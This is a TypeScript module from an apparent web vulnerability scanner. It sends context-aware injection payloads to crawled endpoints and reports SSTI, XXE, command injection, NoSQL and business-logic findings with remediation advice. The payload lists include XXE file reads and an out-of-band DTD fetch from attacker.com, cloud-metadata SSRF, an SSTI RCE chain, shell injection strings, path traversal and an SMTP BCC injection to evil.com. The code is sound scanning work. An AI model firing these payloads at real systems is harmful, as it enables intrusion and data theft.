// VibeCode — Cognitive Exploitation & AI-Assisted Analysis
// JS deobfuscation analysis, context-aware fuzzing, business logic hypothesis
// ADDITIVE module — does not modify existing scanners

import type { CrawledEndpoint, DetectorResult } from '@/types';
import { generateProbeToken } from '@/scanner/payloads';
import { buildRequestString, buildResponseString } from '@/lib/utils';

interface CognitiveConfig {
    baseUrl: string;
    requestTimeout: number;
    userAgent: string;
    authHeaders?: Record<string, string>;
}

async function probe(
    url: string, method: string, config: CognitiveConfig,
    body?: string, contentType?: string, headers?: Record<string, string>,
): Promise<{ status: number; body: string; time: number; reqStr: string; resStr: string; headers: Record<string, string> } | null> {
    try {
        const h: Record<string, string> = { 'User-Agent': config.userAgent, ...config.authHeaders, ...headers };
        if (contentType) h['Content-Type'] = contentType;
        const start = Date.now();
        const r = await fetch(url, { method, headers: h, body, signal: AbortSignal.timeout(config.requestTimeout), redirect: 'manual' });
        const respBody = await r.text();
        const respHeaders: Record<string, string> = {};
        r.headers.forEach((v, k) => { respHeaders[k] = v; });
        return { status: r.status, body: respBody, time: Date.now() - start, reqStr: buildRequestString(method, url, h, body), resStr: buildResponseString(r.status, respHeaders, respBody), headers: respHeaders };
    } catch { return null; }
}

// ============================================================
// 1) CONTEXT-AWARE FUZZING ENGINE
// ============================================================

/** Generate context-specific payloads based on parameter name semantics */
function generateContextPayloads(paramName: string, paramValue?: string): Array<{ payload: string; attackType: string; description: string }> {
    const name = paramName.toLowerCase();
    const payloads: Array<{ payload: string; attackType: string; description: string }> = [];

    // XML/XXE context
    if (name.includes('xml') || name.includes('data') || name.includes('body') || name.includes('content') || name.includes('payload')) {
        payloads.push(
            { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', attackType: 'xxe', description: 'Classic XXE with file read' },
            { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', attackType: 'xxe_ssrf', description: 'XXE to SSRF for cloud metadata' },
            { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><root>test</root>', attackType: 'xxe_oob', description: 'Blind XXE with OOB exfiltration' },
        );
    }

    // SSTI context
    if (name.includes('template') || name.includes('render') || name.includes('view') || name.includes('page') || name.includes('layout') || name.includes('theme')) {
        payloads.push(
            { payload: '{{7*7}}', attackType: 'ssti', description: 'Jinja2/Twig SSTI probe (expects 49)' },
            { payload: '${7*7}', attackType: 'ssti', description: 'Freemarker/Thymeleaf SSTI probe' },
            { payload: '<%= 7*7 %>', attackType: 'ssti', description: 'ERB/EJS SSTI probe' },
            { payload: '#{7*7}', attackType: 'ssti', description: 'Pug/Slim SSTI probe' },
            { payload: "{{''.__class__.__mro__[2].__subclasses__()}}", attackType: 'ssti_rce', description: 'Python SSTI RCE chain' },
        );
    }

    // LDAP context
    if (name.includes('user') || name.includes('dn') || name.includes('cn') || name.includes('ldap') || name.includes('search') || name.includes('filter')) {
        payloads.push(
            { payload: '*)(objectClass=*', attackType: 'ldap_injection', description: 'LDAP wildcard injection' },
            { payload: '*)(&', attackType: 'ldap_injection', description: 'LDAP filter closure' },
            { payload: 'admin)(|(password=*))', attackType: 'ldap_injection', description: 'LDAP password extraction probe' },
        );
    }

    // JSON/NoSQL context
    if (name.includes('query') || name.includes('filter') || name.includes('find') || name.includes('where') || name.includes('search')) {
        payloads.push(
            { payload: '{"$gt":""}', attackType: 'nosql_injection', description: 'MongoDB $gt operator injection' },
            { payload: '{"$ne":""}', attackType: 'nosql_injection', description: 'MongoDB $ne bypass' },
            { payload: '{"$regex":".*"}', attackType: 'nosql_injection', description: 'MongoDB regex injection' },
            { payload: '{"$where":"sleep(5000)"}', attackType: 'nosql_injection', description: 'MongoDB time-based NoSQLi' },
        );
    }

    // File/path context
    if (name.includes('file') || name.includes('path') || name.includes('dir') || name.includes('folder') || name.includes('name') || name.includes('upload')) {
        payloads.push(
            { payload: '../../../etc/passwd', attackType: 'path_traversal', description: 'Unix path traversal' },
            { payload: '..\\..\\..\\windows\\win.ini', attackType: 'path_traversal', description: 'Windows path traversal' },
            { payload: 'file:///etc/passwd', attackType: 'lfi', description: 'Local file inclusion via file:// URI' },
            { payload: 'php://filter/convert.base64-encode/resource=/etc/passwd', attackType: 'lfi', description: 'PHP filter chain LFI' },
        );
    }

    // Email context
    if (name.includes('email') || name.includes('mail') || name.includes('to') || name.includes('from') || name.includes('recipient')) {
        payloads.push(
            { payload: 'test@test.com%0d%0aBcc:attacker@evil.com', attackType: 'header_injection', description: 'SMTP header injection (BCC)' },
            { payload: 'test@test.com\r\nSubject:Injected', attackType: 'header_injection', description: 'SMTP header injection (Subject)' },
        );
    }

    // Command context
    if (name.includes('cmd') || name.includes('exec') || name.includes('command') || name.includes('run') || name.includes('ping') || name.includes('host') || name.includes('ip')) {
        payloads.push(
            { payload: '; id', attackType: 'cmd_injection', description: 'Unix command injection (semicolon)' },
            { payload: '| id', attackType: 'cmd_injection', description: 'Unix command injection (pipe)' },
            { payload: '`id`', attackType: 'cmd_injection', description: 'Unix command injection (backtick)' },
            { payload: '$(id)', attackType: 'cmd_injection', description: 'Unix command injection (subshell)' },
            { payload: '& whoami', attackType: 'cmd_injection', description: 'Windows command injection' },
        );
    }

    // Callback/URL context
    if (name.includes('callback') || name.includes('webhook') || name.includes('notify') || name.includes('return') || name.includes('continue')) {
        const token = generateProbeToken();
        payloads.push(
            { payload: `https://evil.com/callback?token=${token}`, attackType: 'open_redirect', description: 'Callback URL hijacking' },
            { payload: 'javascript:alert(1)', attackType: 'xss', description: 'JavaScript URI in callback' },
        );
    }

    // Numeric context (IDOR)
    if (name.includes('id') || name.includes('user_id') || name.includes('account') || name.includes('order') || name.includes('invoice') || name.includes('ref')) {
        if (paramValue && /^\d+$/.test(paramValue)) {
            const num = parseInt(paramValue);
            payloads.push(
                { payload: String(num - 1), attackType: 'idor', description: `IDOR probe: ${num} -> ${num - 1}` },
                { payload: String(num + 1), attackType: 'idor', description: `IDOR probe: ${num} -> ${num + 1}` },
                { payload: '0', attackType: 'idor', description: 'IDOR boundary: zero' },
                { payload: '-1', attackType: 'idor', description: 'IDOR boundary: negative' },
                { payload: '9999999', attackType: 'idor', description: 'IDOR boundary: large number' },
            );
        }
    }

    return payloads;
}

/** Run context-aware fuzzing on an endpoint */
export async function runContextAwareFuzzing(
    endpoint: CrawledEndpoint, config: CognitiveConfig
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];

    for (const param of endpoint.params) {
        const contextPayloads = generateContextPayloads(param.name, param.value);
        if (contextPayloads.length === 0) continue;

        for (const cp of contextPayloads) {
            let testUrl = endpoint.url;
            let body: string | undefined;
            let contentType: string | undefined;

            if (param.type === 'query') {
                const u = new URL(endpoint.url);
                u.searchParams.set(param.name, cp.payload);
                testUrl = u.toString();
            } else if (param.type === 'body') {
                body = `${encodeURIComponent(param.name)}=${encodeURIComponent(cp.payload)}`;
                contentType = 'application/x-www-form-urlencoded';
            } else if (param.type === 'json') {
                body = JSON.stringify({ [param.name]: cp.payload });
                contentType = 'application/json';
            } else continue;

            const result = await probe(testUrl, param.type === 'query' ? 'GET' : 'POST', config, body, contentType);
            if (!result) continue;

            // Detect SSTI
            if (cp.attackType === 'ssti' && result.body.includes('49')) {
                results.push({
                    found: true,
                    title: `Server-Side Template Injection in "${param.name}"`,
                    description: `SSTI detected: payload ${cp.payload} resolved to 49 in the response, confirming template engine code execution.`,
                    category: 'ssti',
                    severity: 'critical',
                    confidence: 'high',
                    cweId: 'CWE-1336',
                    cweTitle: 'Improper Neutralization of Special Elements Used in a Template Engine',
                    affectedUrl: endpoint.url,
                    httpMethod: param.type === 'query' ? 'GET' : 'POST',
                    parameter: param.name,
                    parameterType: param.type,
                    payload: cp.payload,
                    request: result.reqStr,
                    response: result.resStr,
                    responseCode: result.status,
                    impact: 'SSTI allows arbitrary code execution on the server. An attacker can read files, execute commands, and fully compromise the backend.',
                    remediation: 'Never pass user input directly to template engines. Use sandboxed template rendering. Validate and sanitize all template inputs.',
                    reproductionSteps: [
                        `Set parameter "${param.name}" to: ${cp.payload}`,
                        'Observe that the response contains "49" (result of 7*7)',
                        'This confirms the template engine evaluates user input',
                    ],
                    mappedOwasp: ['A03:2021'],
                    mappedNist: ['SI-10'],
                });
            }

            // Detect XXE
            if (cp.attackType === 'xxe' && (result.body.includes('root:') || result.body.includes('daemon:'))) {
                results.push({
                    found: true,
                    title: `XML External Entity Injection in "${param.name}"`,
                    description: `XXE detected: the server parsed external entity references, returning contents of /etc/passwd.`,
                    category: 'xxe',
                    severity: 'critical',
                    confidence: 'high',
                    cweId: 'CWE-611',
                    cweTitle: 'Improper Restriction of XML External Entity Reference',
                    affectedUrl: endpoint.url,
                    httpMethod: 'POST',
                    parameter: param.name,
                    payload: cp.payload,
                    request: result.reqStr,
                    response: result.resStr,
                    responseCode: result.status,
                    impact: 'XXE allows reading arbitrary files from the server, performing SSRF, and potentially achieving RCE.',
                    remediation: 'Disable external entity processing in XML parsers. Use JSON instead of XML where possible.',
                    mappedOwasp: ['A05:2021'],
                    mappedNist: ['SI-10'],
                });
            }

            // Detect command injection
            if (cp.attackType === 'cmd_injection' && /uid=\d+/.test(result.body)) {
                results.push({
                    found: true,
                    title: `OS Command Injection in "${param.name}"`,
                    description: `Command injection detected: the payload executed system command "id" and output was reflected.`,
                    category: 'cmd_injection',
                    severity: 'critical',
                    confidence: 'high',
                    cweId: 'CWE-78',
                    cweTitle: 'Improper Neutralization of Special Elements used in an OS Command',
                    affectedUrl: endpoint.url,
                    httpMethod: param.type === 'query' ? 'GET' : 'POST',
                    parameter: param.name,
                    payload: cp.payload,
                    request: result.reqStr,
                    response: result.resStr,
                    responseCode: result.status,
                    postExploitationEvidence: result.body.match(/uid=\d+\([\w]+\).*/)?.[0],
                    impact: 'OS command injection provides direct Remote Code Execution (RCE) on the server. Full system compromise.',
                    remediation: 'Never pass user input to OS commands. Use parameterized APIs. Implement strict input validation.',
                    mappedOwasp: ['A03:2021'],
                    mappedNist: ['SI-10'],
                });
            }

            // Detect NoSQL injection
            if (cp.attackType === 'nosql_injection') {
                if (cp.payload.includes('sleep') && result.time > 4500) {
                    results.push({
                        found: true,
                        title: `Time-based NoSQL Injection in "${param.name}"`,
                        description: `NoSQL injection via $where sleep() caused ${result.time}ms delay (expected ~5000ms).`,
                        category: 'nosql_injection',
                        severity: 'critical',
                        confidence: 'medium',
                        cweId: 'CWE-943',
                        affectedUrl: endpoint.url,
                        httpMethod: param.type === 'query' ? 'GET' : 'POST',
                        parameter: param.name,
                        payload: cp.payload,
                        responseTime: result.time,
                        impact: 'NoSQL injection allows data extraction, authentication bypass, and potentially RCE via server-side JavaScript.',
                        remediation: 'Sanitize operator keys ($gt, $ne, $where, etc.). Use input validation. Avoid passing raw user input to database queries.',
                        mappedOwasp: ['A03:2021'],
                    });
                }
            }
        }
    }

    return results;
}

// ============================================================
// 2) BUSINESS LOGIC FLAW DETECTION
// ============================================================

/** Detect common business logic flaws */
export async function detectBusinessLogicFlaws(
    endpoint: CrawledEndpoint, config: CognitiveConfig
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];

    // Test for negative value bypass in amount/price/quantity
    const numericParams = endpoint.params.filter(p =>
        /amount|price|quantity|qty|count|total|value|cost|fee|balance|credit|point|score|vote|rating|discount/i.test(p.name)
    );

    for (const param of numericParams) {
        const negativePayloads = ['-1', '-100', '-0.01', '0', '99999999'];

        for (const payload of negativePayloads) {
            let testUrl = endpoint.url;
            let body: string | undefined;

            if (param.type === 'query') {
                const u = new URL(endpoint.url);
                u.searchParams.set(param.name, payload);
                testUrl = u.toString();
            } else {
                body = `${encodeURIComponent(param.name)}=${encodeURIComponent(payload)}`;
            }

            const result = await probe(testUrl, param.type === 'query' ? 'GET' : 'POST', config, body, body ? 'application/x-www-form-urlencoded' : undefined);
            if (!result) continue;

            // If server accepts negative/zero values without error
            if (result.status >= 200 && result.status < 400 && payload.startsWith('-')) {
                results.push({
                    found: true,
                    title: `Negative Value Accepted for "${param.name}" at ${endpoint.url}`,
                    description: `The endpoint accepted a negative value (${payload}) for parameter "${param.name}" without rejection. This may allow balance manipulation, refund abuse, or quantity underflow.`,
                    category: 'business_logic',
                    severity: 'high',
                    confidence: 'low',
                    cweId: 'CWE-20',
                    cweTitle: 'Improper Input Validation',
                    affectedUrl: endpoint.url,
                    httpMethod: param.type === 'query' ? 'GET' : 'POST',
                    parameter: param.name,
                    payload: payload,
                    request: result.reqStr,
                    response: result.resStr,
                    responseCode: result.status,
                    impact: 'Accepting negative values for financial/quantity parameters can lead to fund theft, balance manipulation, free items, or credit inflation.',
                    remediation: 'Validate all numeric inputs on the server side. Enforce minimum/maximum bounds. Reject negative values for quantities and amounts.',
                    mappedOwasp: ['A04:2021'],
                });
                break; // One finding per param
            }
        }
    }

    // Test for parameter tampering on role/privilege params
    const roleParams = endpoint.params.filter(p =>
        /role|admin|privileged|is_admin|isadmin|user_type|usertype|level|permission|access/i.test(p.name)
    );

    for (const param of roleParams) {
        const escalationPayloads = ['admin', 'administrator', 'root', 'superuser', '1', 'true'];

        for (const payload of escalationPayloads) {
            let testUrl = endpoint.url;
            let body: string | undefined;

            if (param.type === 'query') {
                const u = new URL(endpoint.url);
                u.searchParams.set(param.name, payload);
                testUrl = u.toString();
            } else {
                body = `${encodeURIComponent(param.name)}=${encodeURIComponent(payload)}`;
            }

            const result = await probe(testUrl, param.type === 'query' ? 'GET' : 'POST', config, body, body ? 'application/x-www-form-urlencoded' : undefined);
            if (!result) continue;

            if (result.status >= 200 && result.status < 400) {
                results.push({
                    found: true,
                    title: `Potential Privilege Escalation via "${param.name}"`,
                    description: `The endpoint accepted role/privilege parameter "${param.name}" with value "${payload}" without rejection (HTTP ${result.status}). This may allow horizontal or vertical privilege escalation.`,
                    category: 'business_logic',
                    severity: 'critical',
                    confidence: 'low',
                    cweId: 'CWE-269',
                    cweTitle: 'Improper Privilege Management',
                    affectedUrl: endpoint.url,
                    httpMethod: param.type === 'query' ? 'GET' : 'POST',
                    parameter: param.name,
                    payload: payload,
                    request: result.reqStr,
                    responseCode: result.status,
                    impact: 'If the server processes the role parameter from client input, attackers can escalate to admin privileges, bypassing all authorization controls.',
                    remediation: 'Never accept role/privilege parameters from client-side input. Derive user roles from server-side session only. Implement strict RBAC.',
                    mappedOwasp: ['A01:2021'],
                    mappedNist: ['AC-6'],
                });
                break;
            }
        }
    }

    return results;
}
